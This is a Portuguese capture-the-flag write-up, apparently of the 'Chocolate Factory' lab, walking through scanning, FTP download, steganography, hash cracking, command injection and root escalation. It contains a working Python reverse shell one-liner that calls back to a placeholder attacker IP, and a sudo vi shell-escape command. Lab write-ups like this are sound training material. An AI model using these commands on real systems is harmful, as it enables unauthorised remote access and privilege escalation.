
# Chocolate Factory

* ### Scan de portas - Verificando quais portas estão abertas.
```bash
rustscan -a 10.10.47.129
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6f18a229-b597-4880-8b79-6b152b2b9196)

![image](https://github.com/lufffe/Writeups/assets/90646635/255cf7cc-0e26-4509-8023-ccbe5dee1f11)

* ### Verificando o que está rodando nas portas encontradas, não da para listar tudo, pois são muitas portas.
```bash
nmap -A -p 22,21,80,100,101,102,103,104,105,107,108,106,109,110,112,111,113,114,115,116,117,118,120,121,119,122,123,124,125 10.10.47.129
```
![image](https://github.com/lufffe/Writeups/assets/90646635/74a0fd17-2133-49ff-98e3-4e40bd749e2a)

* ### Verificando e baixando arquivo que estava no FTP.
```bash
ftp 10.10.47.129
```
![image](https://github.com/lufffe/Writeups/assets/90646635/28543fd1-820c-4a83-89f0-613769e8ded3)

* ### Extraindo informação escondida na imagem.
```bash
steghide extract -sf gum_room.jpg
```
![image](https://github.com/lufffe/Writeups/assets/90646635/0f1b3ae7-a591-4af2-9681-1ed2e2c21510)

* ### Lendo Arquivo baixado.
```bash
cat b64.txt 
```
![image](https://github.com/lufffe/Writeups/assets/90646635/c84bb488-60d5-45fa-9cdf-49a3c3b55f91)

* ### Decodificando as informações do arquivo, usando o decode base64.
![image](https://github.com/lufffe/Writeups/assets/90646635/09e14cb1-2af5-434e-84f3-d3067e592f64)

* ### Tentando descobrir a senha do hash encontrado.
```bash
john hash --wordlist=rockyou.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/d0fcf084-9ae2-4233-aee3-3d46559e1899)

* ### Olhando HTTP .
![image](https://github.com/lufffe/Writeups/assets/90646635/c6e68fee-1da1-428e-a99f-e352d69d2768)

* ### Usando o Login e Senha encontrados, conseguimos logar e encontramos um campo e botão para executar comandos.
![image](https://github.com/lufffe/Writeups/assets/90646635/4526d6ec-a87e-4050-8ddf-d975adda8053)

* ### Coloca o Netcat para ficar ouvindo em uma porta e usa a Sheel Reversa, e essa que eu usei.
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("SEU_IP",PORTA));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

![image](https://github.com/lufffe/Writeups/assets/90646635/263625d5-ef5d-4245-930c-61263029d2ee)

* ### No Home tem um usuário Charlie, a flag está lá mais não temos permissão de leitura, mas tem um arquivo chamado teleport, que é uma chave RSA.
![image](https://github.com/lufffe/Writeups/assets/90646635/01cbc011-a810-45df-918f-e8b9f7db15df)

* ### Dando permissão a chave RSA, e fazendo acesso por SSH.
![image](https://github.com/lufffe/Writeups/assets/90646635/2f8466bc-aebe-4382-9ebb-38cb5af1b1eb)

* ### Flag Usuário.
```bash
cat user.txt
```

* ### Buscando um ponto para escalar previlégio do Usuário.
```bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/dff322d5-5448-496c-adca-c3b764e87c2c)

* ### GTFobins.
![image](https://github.com/lufffe/Writeups/assets/90646635/56ff433d-0cf3-4490-81c8-5949cf2ac7bb)
```bash
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
```
![image](https://github.com/lufffe/Writeups/assets/90646635/e457b5d9-115d-4c87-a0f2-62250e89caf4)

* ### Tentei buscar direto o /root/root.txt, mas o arquivo não existia, dps de ver tem um arquivo root.py, depois de testar algumas coisas lembrei da chave que tinha encontrado lá no inicio.
![image](https://github.com/lufffe/Writeups/assets/90646635/69fad255-ef8d-470e-8901-dfba9a8799b2)

* ### E então descobri a flag Root.
![image](https://github.com/lufffe/Writeups/assets/90646635/48b41b99-539a-42d1-8977-d29870bfedc9)


